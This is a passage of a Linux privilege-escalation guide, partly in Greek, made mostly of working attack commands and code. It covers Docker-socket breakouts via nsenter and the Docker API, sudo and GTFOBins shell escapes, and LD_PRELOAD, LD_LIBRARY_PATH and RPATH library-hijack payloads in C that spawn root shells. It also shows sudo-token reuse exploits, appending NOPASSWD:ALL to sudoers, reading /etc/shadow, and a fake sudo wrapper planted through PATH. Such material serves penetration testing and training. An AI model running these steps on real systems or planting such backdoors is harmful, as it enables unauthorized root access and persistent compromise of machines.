docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Others

Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus είναι ένα προηγμένο **σύστημα Επικοινωνίας Μεταξύ Διαδικασιών (IPC)** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα αποτελεσματικά. Σχεδιασμένο με γνώμονα το σύγχρονο σύστημα Linux, προσφέρει ένα ισχυρό πλαίσιο για διάφορες μορφές επικοινωνίας εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που ενισχύει την ανταλλαγή δεδομένων μεταξύ διαδικασιών, θυμίζοντας **βελτιωμένα sockets τομέα UNIX**. Επιπλέον, βοηθά στην εκπομπή γεγονότων ή σημάτων, προάγοντας την απρόσκοπτη ενσωμάτωση μεταξύ των συστατικών του συστήματος. Για παράδειγμα, ένα σήμα από έναν δαίμονα Bluetooth σχετικά με μια εισερχόμενη κλήση μπορεί να προκαλέσει έναν αναπαραγωγέα μουσικής να σιγήσει, βελτιώνοντας την εμπειρία του χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα σύστημα απομακρυσμένων αντικειμένων, απλοποιώντας τις αιτήσεις υπηρεσιών και τις κλήσεις μεθόδων μεταξύ εφαρμογών, ρέοντας διαδικασίες που παραδοσιακά ήταν περίπλοκες.

Το D-Bus λειτουργεί με ένα **μοντέλο επιτρεπόμενου/απαγορευμένου**, διαχειριζόμενο τις άδειες μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κ.λπ.) με βάση το σωρευτικό αποτέλεσμα των κανόνων πολιτικής που ταιριάζουν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το λεωφορείο, επιτρέποντας ενδεχομένως την κλιμάκωση προνομίων μέσω της εκμετάλλευσης αυτών των αδειών.

Ένα παράδειγμα μιας τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf` παρέχεται, λεπτομερώς τις άδειες για τον χρήστη root να κατέχει, να στέλνει και να λαμβάνει μηνύματα από `fi.w1.wpa_supplicant1`.

Πολιτικές χωρίς καθορισμένο χρήστη ή ομάδα ισχύουν καθολικά, ενώ οι πολιτικές "προεπιλογής" ισχύουν για όλα τα μη καλυπτόμενα από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθετε πώς να καταγράφετε και να εκμεταλλεύεστε μια επικοινωνία D-Bus εδώ:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να καταγράφετε το δίκτυο και να κατανοείτε τη θέση της μηχανής.

### Γενική καταγραφή
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ανοιχτές θύρες

Πάντα να ελέγχετε τις υπηρεσίες δικτύου που εκτελούνται στη μηχανή με την οποία δεν μπορέσατε να αλληλεπιδράσετε πριν την πρόσβαση σε αυτήν:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Ελέγξτε αν μπορείτε να καταγράψετε την κίνηση. Αν μπορείτε, θα μπορούσατε να αποκτήσετε κάποιες διαπιστευτήρια.
```
timeout 1 tcpdump
```
## Χρήστες

### Γενική Αρίθμηση

Έλεγξε **ποιος** είσαι, ποιες **άδειες** έχεις, ποιοι **χρήστες** υπάρχουν στα συστήματα, ποιοι μπορούν να **συνδεθούν** και ποιοι έχουν **root άδειες:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Ορισμένες εκδόσεις του Linux επηρεάστηκαν από ένα σφάλμα που επιτρέπει στους χρήστες με **UID > INT\_MAX** να κερδίζουν δικαιώματα. Περισσότερες πληροφορίες: [εδώ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [εδώ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [εδώ](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Groups

Ελέγξτε αν είστε **μέλος κάποιου group** που θα μπορούσε να σας δώσει δικαιώματα root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Clipboard

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον μέσα στο clipboard (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών Πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί

Αν **γνωρίζετε οποιονδήποτε κωδικό** του περιβάλλοντος **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον κωδικό.

### Su Brute

Αν δεν σας πειράζει να κάνετε πολύ θόρυβο και τα δυαδικά `su` και `timeout` είναι παρόντα στον υπολογιστή, μπορείτε να προσπαθήσετε να κάνετε brute-force χρήστη χρησιμοποιώντας [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` προσπαθεί επίσης να κάνει brute-force χρήστες.

## Καταχρήσεις Writable PATH

### $PATH

Αν διαπιστώσετε ότι μπορείτε να **γράψετε μέσα σε κάποιον φάκελο του $PATH** μπορεί να είστε σε θέση να κλιμακώσετε τα δικαιώματα σας δημιουργώντας **μια πίσω πόρτα μέσα στον εγγράψιμο φάκελο** με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από έναν διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από φάκελο που βρίσκεται πριν** από τον εγγράψιμο φάκελο σας στο $PATH.

### SUDO και SUID

Μπορεί να σας επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας sudo ή μπορεί να έχουν το bit suid. Ελέγξτε το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Ορισμένες **αναπάντεχες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμη και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η ρύθμιση του Sudo μπορεί να επιτρέπει σε έναν χρήστη να εκτελεί κάποια εντολή με τα δικαιώματα άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα, ο χρήστης `demo` μπορεί να εκτελέσει `vim` ως `root`, είναι τώρα απλό να αποκτήσει κανείς ένα shell προσθέτοντας ένα ssh key στον κατάλογο root ή καλώντας `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάτι:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στη μηχανή HTB Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking** για να φορτώσει μια αυθαίρετη βιβλιοθήκη python ενώ εκτελεί το σενάριο ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**Μετάβαση** για να διαβάσετε άλλα αρχεία ή να χρησιμοποιήσετε **συμβολικούς συνδέσμους**. Για παράδειγμα, στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί ένα **wildcard** (\*), είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Αντεπίθεσεις**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Εντολή Sudo/SUID δυαδικό αρχείο χωρίς διαδρομή εντολής

Εάν η **άδεια sudo** δίνεται σε μια μόνο εντολή **χωρίς να καθορίζεται η διαδρομή**: _hacker10 ALL= (root) less_ μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** δυαδικό αρχείο **εκτελεί μια άλλη εντολή χωρίς να καθορίζει τη διαδρομή της (πάντα έλεγξε με** _**strings**_ **το περιεχόμενο ενός παράξενου SUID δυαδικού αρχείου)**.

[Παραδείγματα payload για εκτέλεση.](payloads-to-execute.md)

### SUID δυαδικό αρχείο με διαδρομή εντολής

Αν το **suid** δυαδικό αρχείο **εκτελεί μια άλλη εντολή καθορίζοντας τη διαδρομή**, τότε, μπορείς να προσπαθήσεις να **εξάγεις μια συνάρτηση** με το όνομα της εντολής που καλεί το αρχείο suid.

Για παράδειγμα, αν ένα suid δυαδικό αρχείο καλεί _**/usr/sbin/service apache2 start**_ πρέπει να προσπαθήσεις να δημιουργήσεις τη συνάρτηση και να την εξάγεις:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

The **LD\_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

* The loader disregards **LD\_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
* For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Η εκμετάλλευση δικαιωμάτων μπορεί να συμβεί αν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει τη δήλωση **env\_keep+=LD\_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD\_PRELOAD** να παραμείνει και να αναγνωρίζεται ακόμη και όταν οι εντολές εκτελούνται με `sudo`, ενδεχομένως οδηγώντας στην εκτέλεση αυθαίρετου κώδικα με ανυψωμένα δικαιώματα.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Τότε **συγκεντρώστε το** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **escalate privileges** εκτελώντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Μια παρόμοια εκμετάλλευση μπορεί να καταχραστεί αν ο επιτιθέμενος ελέγχει τη μεταβλητή περιβάλλοντος **LD\_LIBRARY\_PATH** επειδή ελέγχει τη διαδρομή όπου θα αναζητούνται οι βιβλιοθήκες.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν συναντάτε ένα δυαδικό αρχείο με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να επαληθεύσετε αν φορτώνει σωστά τα αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την παρακάτω εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η συνάντηση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει μια πιθανότητα εκμετάλλευσης.

Για να εκμεταλλευτεί κανείς αυτό, θα προχωρήσει δημιουργώντας ένα αρχείο C, ας πούμε _"/path/to/.config/libcalc.c"_, που περιέχει τον παρακάτω κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει να ανυψώσει τα δικαιώματα μέσω της χειραγώγησης των αδειών αρχείων και της εκτέλεσης ενός shell με ανυψωμένα δικαιώματα.

Μεταγλωττίστε το παραπάνω αρχείο C σε ένα κοινόχρηστο αντικείμενο (.so) με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεαζόμενου SUID δυαδικού αρχείου θα πρέπει να ενεργοποιήσει την εκμετάλλευση, επιτρέποντας πιθανή παραβίαση του συστήματος.

## Hijacking Κοινών Αντικειμένων
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που έχουμε βρει ένα SUID δυαδικό αρχείο που φορτώνει μια βιβλιοθήκη από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη βιβλιοθήκη σε αυτόν τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Αν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
αυτό σημαίνει ότι η βιβλιοθήκη που έχετε δημιουργήσει πρέπει να έχει μια συνάρτηση που ονομάζεται `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα Unix δυαδικών αρχείων που μπορούν να εκμεταλλευτούν από έναν επιτιθέμενο για να παρακάμψουν τους τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **μόνο να εισάγετε επιχειρήματα** σε μια εντολή.

Το έργο συλλέγει νόμιμες συναρτήσεις Unix δυαδικών αρχείων που μπορούν να καταχραστούν για να σπάσουν περιορισμένα κέλυφη, να κλιμακώσουν ή να διατηρήσουν ανυψωμένα προνόμια, να μεταφέρουν αρχεία, να δημιουργήσουν bind και reverse shells, και να διευκολύνουν άλλες μετα-εκμεταλλευτικές εργασίες.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Εάν μπορείτε να αποκτήσετε πρόσβαση στο `sudo -l`, μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν βρίσκει πώς να εκμεταλλευτεί οποιονδήποτε κανόνα sudo.

### Επαναχρησιμοποίηση Σημείων Sudo

Σε περιπτώσεις όπου έχετε **πρόσβαση sudo** αλλά όχι τον κωδικό πρόσβασης, μπορείτε να κλιμακώσετε τα προνόμια σας **περιμένοντας την εκτέλεση μιας εντολής sudo και στη συνέχεια αναλαμβάνοντας το session token**.

Απαιτήσεις για την κλιμάκωση προνομίων:

* Έχετε ήδη ένα κέλυφος ως χρήστης "_sampleuser_"
* "_sampleuser_" έχει **χρησιμοποιήσει `sudo`** για να εκτελέσει κάτι στα **τελευταία 15 λεπτά** (κατά προεπιλογή αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιούμε `sudo` χωρίς να εισάγουμε οποιονδήποτε κωδικό πρόσβασης)
* `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
* `gdb` είναι προσβάσιμο (μπορείτε να το ανεβάσετε)

(Μπορείτε προσωρινά να ενεργοποιήσετε το `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας το `/etc/sysctl.d/10-ptrace.conf` και ρυθμίζοντας `kernel.yama.ptrace_scope = 0`)

Εάν πληρούνται όλες αυτές οι απαιτήσεις, **μπορείτε να κλιμακώσετε τα προνόμια χρησιμοποιώντας:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)

* Η **πρώτη εκμετάλλευση** (`exploit.sh`) θα δημιουργήσει το δυαδικό `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το sudo token στη συνεδρία σας** (δεν θα αποκτήσετε αυτόματα ένα root shell, κάντε `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Η **δεύτερη εκμετάλλευση** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **κατοχυρωμένο από τον root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Η **τρίτη εκμετάλλευση** (`exploit_v3.sh`) θα **δημιουργήσει ένα αρχείο sudoers** που καθιστά **τους sudo tokens αιώνιους και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Αν έχετε **δικαιώματα εγγραφής** στον φάκελο ή σε οποιοδήποτε από τα δημιουργημένα αρχεία μέσα στον φάκελο, μπορείτε να χρησιμοποιήσετε το δυαδικό [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και PID**.\
Για παράδειγμα, αν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως αυτός ο χρήστης με PID 1234, μπορείτε να **αποκτήσετε δικαιώματα sudo** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό πρόσβασης κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιήσει το `sudo` και πώς. Αυτά τα αρχεία **κατά προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, θα μπορούσατε να **αποκτήσετε κάποιες ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** οποιοδήποτε αρχείο, θα είστε σε θέση να **κλιμακώσετε τα δικαιώματα**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις, μπορείς να καταχραστείς αυτήν την άδεια.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος για να καταχραστείτε αυτές τις άδειες:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές στο δυαδικό `sudo`, όπως το `doas` για το OpenBSD, θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Αν γνωρίζετε ότι ένας **χρήστης συνήθως συνδέεται σε μια μηχανή και χρησιμοποιεί το `sudo`** για να κλιμακώσει τα δικαιώματα και έχετε αποκτήσει ένα shell μέσα σε αυτό το περιβάλλον χρήστη, μπορείτε να **δημιουργήσετε ένα νέο εκτελέσιμο sudo** που θα εκτελεί τον κώδικά σας ως root και στη συνέχεια την εντολή του χρήστη. Στη συνέχεια, **τροποποιήστε το $PATH** του περιβάλλοντος χρήστη (για παράδειγμα προσθέτοντας τη νέα διαδρομή στο .bash\_profile) έτσι ώστε όταν ο χρήστης εκτελεί το sudo, το εκτελέσιμο sudo σας να εκτελείται.

Σημειώστε ότι αν ο χρήστης χρησιμοποιεί ένα διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε τη νέα διαδρομή. Για παράδειγμα, το [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί τα `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε ένα άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή εκτελώντας κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα φορτωμένα αρχεία ρυθμίσεων**. Συνήθως, αυτό το αρχείο περιέχει την εξής διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα αρχεία ρυθμίσεων από το `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου **οι βιβλιοθήκες** θα **αναζητηθούν**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Αν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις διαδρομές που υποδεικνύονται: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο εντός του αρχείου ρυθμίσεων μέσα στο `/etc/ld.so.conf.d/*.conf`, μπορεί να είναι σε θέση να κλιμακώσει τα δικαιώματα.\
Ρίξτε μια ματιά στο **πώς να εκμεταλλευτείτε αυτή τη λανθασμένη ρύθμιση** στην επόμενη σελίδα:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Με την αντιγραφή της βιβλιοθήκης στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτό το σημείο όπως καθορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια, δημιουργήστε μια κακή βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

Οι δυνατότητες του Linux παρέχουν ένα **υποσύνολο των διαθέσιμων δικαιωμάτων root σε μια διαδικασία**. Αυτό σπάει αποτελεσματικά τα δικαιώματα root **σε μικρότερες και διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να παραχωρηθεί ανεξάρτητα σε διαδικασίες. Με αυτόν τον τρόπο, το πλήρες σύνολο δικαιωμάτων μειώνεται, μειώνοντας τους κινδύνους εκμετάλλευσης.\
Διαβάστε την παρακάτω σελίδα για να **μάθετε περισσότερα σχετικά με τις δυνατότητες και πώς να τις εκμεταλλευτείτε**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit για "εκτέλεση"** υποδηλώνει ότι ο επηρεαζόμενος χρήστης μπορεί να "**cd**" στον φάκελο.\
Το **"αναγνωστικό"** bit υποδηλώνει ότι ο χρήστης μπορεί να **καταγράψει** τα **αρχεία**, και το **"γραφής"** bit υποδηλώνει ότι ο χρήστης μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.

## ACLs

